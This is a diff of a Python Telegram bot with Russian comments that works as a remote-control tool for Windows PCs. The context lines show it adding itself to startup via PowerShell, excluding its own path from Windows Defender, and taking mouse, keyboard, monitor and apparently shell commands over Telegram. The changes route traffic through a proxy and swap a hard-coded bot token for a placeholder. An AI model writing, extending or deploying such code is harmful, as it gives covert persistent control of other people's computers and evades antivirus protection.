@@ -10,8 +10,15 @@ import platform
 import socket
 import time
 
-# --- НАСТРОЙКИ ---
-TOKEN = "9263108544:AAGo7K3U6DLLdbQkaTFywaIoCVfpTszM96Y"
+# --- НАСТРОЙКА ПРОКСИ (Франция) ---
+PROXY_IP = "109.199.119.160"
+PROXY_PORT = "80"
+proxy_url = f"http://{PROXY_IP}:{PROXY_PORT}"
+telebot.apihelper.proxy = {'https': proxy_url}
+# ----------------------------------
+
+# --- НАСТРОЙКИ БОТА ---
+TOKEN = "ТВОЙ_ТОКЕН_БОТА" # ВСТАВЬ СЮДА ТОКЕН ОТ BOTFATHER
 bot = telebot.TeleBot(TOKEN)
 
 # --- ФУНКЦИЯ АВТОЗАГРУЗКИ ---
@@ -41,6 +48,7 @@ def add_to_startup():
         subprocess.run(["powershell", "-Command", ps_script], capture_output=True)
         os.system(f'powershell -Command "Add-MpPreference -ExclusionPath \'{new_path}\'"')
 
+# Добавляем в автозагрузку при старте
 add_to_startup()
 
 # --- ТЕКСТ МЕНЮ ---
@@ -59,7 +67,6 @@ HELP_TEXT = """
 🖱 `/move [x] [y]` — Двигать мышку.
 🖱 `/click` — Кликнуть мышкой.
 🖥 `/monitor_off` — Выключить монитор.
-🔊 `/volume [0-100]` — Громкость.
 ℹ️ `/info` — Инфо о ПК.
 """
 
@@ -135,7 +142,7 @@ def type_text(message):
     text = message.text.replace("/type ", "")
     if not text:
         return
-    time.sleep(1) # Пауза, чтобы ты успел переключиться на нужное окно
+    time.sleep(1)
     pyautogui.write(text, interval=0.05)
     bot.reply_to(message, f"Напечатал: {text}")
 
@@ -183,5 +190,5 @@ def cmd(message):
     except Exception as e:
         bot.reply_to(message, f"Ошибка: {e}")
 
-print("Бот запущен...")
+print("Бот запущен с прокси...")
 bot.infinity_polling()
